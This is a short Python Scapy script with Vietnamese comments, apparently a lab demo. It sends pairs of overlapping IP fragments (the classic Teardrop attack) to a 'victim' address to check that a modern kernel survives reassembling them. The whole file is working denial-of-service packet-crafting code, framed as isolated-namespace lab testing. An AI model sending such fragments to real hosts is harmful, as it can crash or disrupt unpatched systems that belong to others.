#!/usr/bin/env python3
# teardrop.py - Che tao cac manh IP CHONG LAN (overlapping fragments) kieu Teardrop.
# Muc dich HOC TAP: kiem chung kernel hien dai XU LY AN TOAN (khong crash) khi
# phai tai-rap cac manh xau. LAB-ONLY - chi chay trong namespace co lap.
#
# Chay trong namespace attacker (can root):
#   sudo ip netns exec h1 python3 teardrop.py
#   sudo ip netns exec h1 python3 teardrop.py --rounds 50
#
import argparse
from scapy.all import IP, send


def main():
    ap = argparse.ArgumentParser(description="Teardrop overlapping-fragments demo (lab-only)")
    ap.add_argument("--dst", default="10.0.0.2", help="IP victim")
    ap.add_argument("--id", type=int, default=1234, help="IP id cua manh (moi round +1)")
    ap.add_argument("--rounds", type=int, default=1, help="So lan gui cap manh chong lan")
    args = ap.parse_args()

    for n in range(args.rounds):
        ipid = args.id + n
        # Manh 1: offset 0, co co MF (con manh), 24 byte = 3 don vi 8-byte -> phu byte 0..23
        f1 = IP(dst=args.dst, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)
        # Manh 2: offset=1 (=8 byte), KHONG MF (manh cuoi), 24 byte -> phu byte 8..31
        #         => CHONG LAN voi manh 1 o khoang byte 8..23 (dac trung teardrop)
        f2 = IP(dst=args.dst, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)
        send([f1, f2], verbose=0)

    print(f"[+] Da gui {args.rounds} cap manh IP chong lan (teardrop) toi {args.dst}")
    print("[i] Kiem tra terminal ping nen cua victim: no phai VAN SONG binh thuong.")


if __name__ == "__main__":
    main()
